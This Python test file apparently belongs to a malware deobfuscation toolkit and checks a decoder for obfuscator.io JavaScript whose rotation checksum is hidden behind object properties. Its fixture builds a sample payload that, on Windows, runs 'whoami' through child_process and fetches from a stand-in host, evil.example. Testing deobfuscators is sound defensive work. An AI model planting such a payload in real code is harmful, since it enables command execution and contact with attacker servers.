"""obfio_objprop: recover an obfuscator.io string array whose rotation checksum indexes the decoder
through a local const-object's properties (which stock deobf.derive cannot resolve)."""
import re

from tools.common import deobf
from tools.common.decoders import load_decoder, obfio_objprop
from tools.tests.obfio import obfuscate

USES = {"os": "os", "platform": "platform", "win": "win32", "cp": "child_process",
        "cmd": "whoami", "url": "https://evil.example/x"}
TEMPLATE = ("const os=require({os});\n"
            "if(os[{platform}]()==={win}){{require({cp}).exec({cmd});fetch({url});}}\n")


def _indirect_checksum(src: str) -> str:
    """Rewrite the three checksum args parseInt(_0xc(0xNNN,'key')) to parseInt(_0xc(_0xOBJ._pK,'key'))."""
    nums = re.findall(r"parseInt\(_0xc\((\d+),'kQ9z'\)\)", src)
    assert len(nums) >= 3, nums
    uniq = list(dict.fromkeys(nums))[:3]
    obj = "const _0xOBJ={" + ",".join(f"_p{i}:{n}" for i, n in enumerate(uniq)) + "};"
    for i, n in enumerate(uniq):
        src = src.replace(f"parseInt(_0xc({n},'kQ9z'))", f"parseInt(_0xc(_0xOBJ._p{i},'kQ9z'))")
    # declare the object at program scope, just before the rotation IIFE
    return src.replace("(function(_0xq,_0xt)", obj + "(function(_0xq,_0xt)", 1)


def test_stock_deobf_cannot_resolve_objprop_checksum():
    src = _indirect_checksum(obfuscate(USES, TEMPLATE, variant="base64", rotation=7)).encode()
    assert deobf.derive(src) is None


def test_objprop_module_recovers_the_payload():
    src = _indirect_checksum(obfuscate(USES, TEMPLATE, variant="base64", rotation=7)).encode()
    out = obfio_objprop.decode(src, {}, None).decode()
    assert 'const os=require("os");' in out
    assert 'require("child_process").exec("whoami")' in out
    assert 'fetch("https://evil.example/x")' in out


def test_reproducible():
    src = _indirect_checksum(obfuscate(USES, TEMPLATE, variant="base64")).encode()
    assert obfio_objprop.decode(src, {}, None) == obfio_objprop.decode(src, {}, None)


def test_registered():
    assert callable(load_decoder("obfio_objprop"))
